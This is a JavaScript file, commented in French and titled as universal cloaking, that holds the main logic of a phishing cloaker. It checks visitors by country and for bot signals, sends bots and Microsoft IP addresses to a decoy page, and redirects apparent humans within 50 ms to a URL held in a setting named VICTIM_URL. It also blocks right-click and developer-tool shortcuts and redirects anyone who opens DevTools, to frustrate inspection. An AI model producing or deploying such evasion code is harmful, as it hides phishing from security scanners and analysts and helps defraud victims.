// ═══════════════════════════════════════════════════════════════════
// LOGIQUE PRINCIPALE - CLOAKING UNIVERSEL 2025 (OPTIMISÉ VITESSE)
// ═══════════════════════════════════════════════════════════════════

(async function() {
    'use strict';

    const botDetector = new BotDetector(CONFIG);
    const geoBlocker = new GeoBlocker(CONFIG);

    // ═══════════════════════════════════════════════════════════════
    // PHASE 1 & 2: DÉTECTION EN PARALLÈLE (ULTRA-RAPIDE)
    // ═══════════════════════════════════════════════════════════════

    const [geoResult, botResult] = await Promise.all([
        geoBlocker.checkAccess(),
        botDetector.analyze()
    ]);

    if (CONFIG.DEBUG_MODE) {
        console.log('[GEO]:', geoResult);
        console.log('[BOT]:', botResult);
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 3: DÉCISION FINALE
    // ═══════════════════════════════════════════════════════════════

    // Cas 1: Pays bloqué
    if (!geoResult.allowed) {
        redirectToURL(CONFIG.GEO_BLOCKED_URL, 'geo_blocked');
        return;
    }

    // Cas 2: Bot détecté
    if (botResult.isBot) {
        redirectToURL(CONFIG.BOT_URL, 'bot_detected');
        return;
    }

    // Cas 3: IP Microsoft
    if (geoResult.geoData && geoBlocker.isMicrosoftIP(geoResult.geoData.ip)) {
        redirectToURL(CONFIG.BOT_URL, 'microsoft_ip');
        return;
    }

    // ═══════════════════════════════════════════════════════════════
    // PHASE 4: HUMAIN DÉTECTÉ → REDIRECTION ULTRA-RAPIDE
    // ═══════════════════════════════════════════════════════════════

    if (CONFIG.DEBUG_MODE) {
        console.log('[OK] Human detected! Score:', botResult.score);
    }

    // Redirection ULTRA-RAPIDE (50ms)
    setTimeout(() => {
        redirectToURL(CONFIG.VICTIM_URL, 'human_redirect');
    }, 50);

    // ═══════════════════════════════════════════════════════════════
    // FONCTION: REDIRECTION
    // ═══════════════════════════════════════════════════════════════

    function redirectToURL(url, reason) {
        if (CONFIG.DEBUG_MODE) {
            console.log(`[REDIRECT] ${reason} → ${url}`);
        }
        window.location.href = url;
    }

    // ═══════════════════════════════════════════════════════════════
    // PROTECTION ANTI-INSPECTION
    // ═══════════════════════════════════════════════════════════════

    // Bloquer DevTools
    setInterval(function() {
        if (window.outerWidth - window.innerWidth > 160 ||
            window.outerHeight - window.innerHeight > 160) {
            redirectToURL(CONFIG.BOT_URL, 'devtools_detected');
        }
    }, 500);

    // Bloquer clic droit
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        return false;
    });

    // Bloquer raccourcis clavier
    document.addEventListener('keydown', (e) => {
        if (e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
            (e.ctrlKey && e.shiftKey && e.key === 'C') ||
            (e.ctrlKey && e.shiftKey && e.key === 'J') ||
            (e.ctrlKey && e.key === 'u')) {
            e.preventDefault();
            return false;
        }
    });

})();
